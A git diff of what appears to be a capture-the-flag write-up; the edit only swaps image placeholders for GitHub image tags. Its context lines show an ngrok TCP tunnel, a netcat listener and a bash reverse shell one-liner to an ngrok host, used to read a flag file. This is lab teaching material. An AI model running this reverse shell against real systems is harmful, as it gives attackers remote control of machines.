@@ -30,7 +30,8 @@ This time, I used `ngrok` to create a temporary domain to forward traffic to my 
 ngrok tcp 444
 ```
 
-nrokimg
+<img width="612" height="58" alt="ngrok" src="https://github.com/user-attachments/assets/ccaff485-2b3c-4ed3-935c-560a12f36bf7" />
+
 
 - This created the temporary domain which will receive the traffic from the vulnerable machine and forward it to my local device at port `444`
 
@@ -48,11 +49,13 @@ nc -lvnp 444
 bash -i >& /dev/tcp/0.tcp.au.ngrok.io/11641 0>&1
 ```
 
-exploit.png
+<img width="530" height="125" alt="exploit" src="https://github.com/user-attachments/assets/9b104779-7e7b-457c-8e54-78fb3a2d72f3" />
+
 
 We can see that the listener catches the connection initiated by the target machine:
 
-revshell.png
+<img width="538" height="100" alt="revshell" src="https://github.com/user-attachments/assets/85f2ed22-a71e-44bf-99b4-41a198ba71b2" />
+
 
 From here we can explore the filesystem and find `flag.txt` in the root directory:
 
